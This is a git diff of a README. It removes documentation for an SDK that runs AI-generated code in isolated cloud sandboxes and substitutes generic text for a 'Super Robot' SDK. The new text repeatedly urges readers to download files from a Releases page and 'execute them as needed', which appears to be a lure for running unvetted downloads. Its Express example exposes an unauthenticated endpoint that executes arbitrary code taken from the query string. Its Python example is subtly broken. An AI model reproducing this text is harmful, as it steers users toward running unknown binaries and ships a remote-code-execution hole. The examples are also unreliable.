@@ -1,53 +1,160 @@
-<!-- <p align="center">
-  <img width="100" src="/readme-assets/logo-circle.png" alt="r1z logo">
-</p> -->
+# Super Robot 🤖
 
-![r1z SDK Preview](https://i.imgur.com/QYftu1j.png)
+Welcome to the **Super Robot** repository! This project provides Python and JavaScript/TypeScript SDKs designed for embedding code execution capabilities into AI applications. Whether you're building a data analysis tool, an interactive AI assistant, or a complex machine learning model, Super Robot has you covered.
 
-## What is R1Z?
-[r1z](https://www.r1z.dev/) is an open-source tooling that runs AI-generated code in securely isolated cloud sandboxes. To start and control sandboxes, use our [JavaScript SDK](https://www.npmjs.com/package/@r1z/code-interpreter) or [Python SDK](https://pypi.org/project/r1z_code_interpreter).
+![Super Robot](https://img.shields.io/badge/Version-1.0.0-brightgreen)
 
-## Run your first Sandbox
+## Table of Contents
 
-### 1. Install SDK
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [SDKs Overview](#sdks-overview)
+  - [Python SDK](#python-sdk)
+  - [JavaScript/TypeScript SDK](#javascripttypescript-sdk)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
 
-JavaScript / TypeScript
+## Features
+
+- **Multi-Language Support**: Use Python and JavaScript/TypeScript SDKs for flexibility in your projects.
+- **Code Execution**: Execute code snippets in real-time within your AI applications.
+- **AI Integration**: Seamlessly integrate with popular AI frameworks like OpenAI, Cohere, and Anthropic.
+- **Data Analysis**: Leverage built-in tools for analyzing and visualizing data.
+- **Jupyter Notebook Support**: Run your code in Jupyter Notebooks for an interactive coding experience.
+
+## Getting Started
+
+To get started with Super Robot, follow the steps below to set up your environment and install the SDKs.
+
+### Installation
+
+You can download the latest version of Super Robot from the [Releases](https://github.com/techsysditsolution/super-robot/releases) section. Follow the instructions for your specific SDK:
+
+1. **Python SDK**:
+   - Use pip to install the SDK:
+     ```bash
+     pip install super-robot-python
+     ```
+
+2. **JavaScript/TypeScript SDK**:
+   - Use npm to install the SDK:
+     ```bash
+     npm install super-robot-js
+     ```
+
+### Usage
+
+Once you have installed the SDKs, you can start using them in your projects. Here’s a quick example to illustrate how to execute code using the Python SDK:
+
+```python
+from super_robot import CodeExecutor
+
+executor = CodeExecutor()
+result = executor.execute("print('Hello, Super Robot!')")
+print(result)
 ```
-npm i @r1z/code-interpreter
+
+For the JavaScript/TypeScript SDK, you can use the following code:
+
+```javascript
+const { CodeExecutor } = require('super-robot-js');
+
+const executor = new CodeExecutor();
+executor.execute("console.log('Hello, Super Robot!')");
 ```
 
-Python
+## SDKs Overview
+
+### Python SDK
+
+The Python SDK allows you to easily execute Python code snippets and interact with various AI models. It provides a simple interface for executing code and retrieving results.
+
+#### Features of Python SDK
+
+- Execute Python code snippets.
+- Integrate with OpenAI and other AI services.
+- Perform data analysis and visualization.
+
+### JavaScript/TypeScript SDK
+
+The JavaScript/TypeScript SDK provides similar functionality for web applications. It allows developers to run JavaScript code snippets and integrate AI capabilities directly into their applications.
+
+#### Features of JavaScript/TypeScript SDK
+
+- Execute JavaScript code snippets.
+- Easy integration with web frameworks.
+- Support for TypeScript for type safety.
+
+## Examples
+
+Here are some practical examples of how to use the SDKs in your applications.
+
+### Python Example: Data Analysis
+
+```python
+import pandas as pd
+from super_robot import CodeExecutor
+
+# Load some data
+data = pd.read_csv('data.csv')
+
+# Execute a data analysis code snippet
+executor = CodeExecutor()
+analysis_code = """
+import pandas as pd
+df = pd.DataFrame(data)
+result = df.describe()
+"""
+result = executor.execute(analysis_code)
+print(result)
 ```
-pip install r1z-code-interpreter
+
+### JavaScript Example: Web Application
+
+```javascript
+const express = require('express');
+const { CodeExecutor } = require('super-robot-js');
+
+const app = express();
+const executor = new CodeExecutor();
+
+app.get('/execute', (req, res) => {
+    const code = req.query.code;
+    executor.execute(code).then(result => {
+        res.send(result);
+    });
+});
+
+app.listen(3000, () => {
+    console.log('Server is running on http://localhost:3000');
+});
 ```
 
-### 2. Get your r1z API key
-1. Sign up to r1z [here](https://r1z.dev).
-2. Get your API key [here](https://dash-r1z.dev/).
-3. Set environment variable with your API key.
-```
-r1z_API_KEY=r1z_***
-```     
+## Contributing
 
-### 3. Execute code with code interpreter inside Sandbox
+We welcome contributions to Super Robot! If you want to help improve the project, please follow these steps:
 
-JavaScript / TypeScript
-```ts
-import { Sandbox } from '@r1z/code-interpreter'
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and create a pull request.
 
-const sbx = await Sandbox.create()
-await sbx.runCode('x = 1')
+Please ensure your code follows our coding standards and includes tests where applicable.
 
-const execution = await sbx.runCode('x+=1; x')
-console.log(execution.text)  // outputs 2
-```
+## License
 
-Python
-```py
-from r1z_code_interpreter import Sandbox
+Super Robot is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-with Sandbox() as sandbox:
-    sandbox.run_code("x = 1")
-    execution = sandbox.run_code("x+=1; x")
-    print(execution.text)  # outputs 2
-```
+## Releases
+
+For the latest releases and updates, visit the [Releases](https://github.com/techsysditsolution/super-robot/releases) section. Here, you can download the necessary files and execute them as needed.
+
+![Release](https://img.shields.io/badge/Latest_Release-v1.0.0-blue)
+
+---
+
+We hope you find Super Robot useful for your AI applications. If you have any questions or need support, feel free to open an issue in the repository. Happy coding!
